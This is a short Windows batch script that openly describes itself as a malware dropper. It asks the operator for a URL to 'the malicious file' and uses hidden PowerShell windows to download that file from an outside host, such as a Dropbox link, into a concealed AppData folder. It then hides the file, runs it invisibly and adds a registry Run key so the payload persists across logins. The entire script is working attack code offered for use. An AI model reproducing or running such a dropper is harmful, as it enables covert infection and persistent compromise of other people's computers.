@echo off
:: Changes the Color to a green type color
color 0B
:: Asks basic questions for the dropper
echo Whats the file name?
set /p name1=">> "
echo Whats the URL to the malicious file? [Replace dl=0 with dl=1 on the end of the dropbox link if your using dropbox]
set /p droplink=">> "
:: Sets all the specific needs for the powershell scripts
set "target_dir=%USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"
set "exe_name=%name1%"
set "full_path=%target_dir%\%exe_name%"
set "dropbox_url=%droplink%"
set "Name=%name1%"
:: Installer powershell command
powershell -windowstyle Hidden -Command "& { $ProgressPreference = 'SilentlyContinue'; if (!(Test-Path '%target_dir%')) { New-Item -ItemType Directory -Path '%target_dir%' -Force }; Invoke-WebRequest -Uri '%dropbox_url%' -OutFile '%full_path%' }"
:: Attributes
attrib +h "%target_dir%" /S /D
attrib +h "%full_path%"
:: Runs the script
powershell -windowstyle Hidden -Command "& { Start-Process -FilePath '%full_path%' -WindowStyle Hidden }"
echo Successfully ran %name1% at %full_path%
:: Adds persistence using regedit [Admin perms not needed for the current user but if you want it to be machine wide this would be modified and had to be run as an administrator]
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%exe_name%" /t REG_SZ /d "%full_path%" /f
echo Successfully Installed %name1%...
pause
exit /b
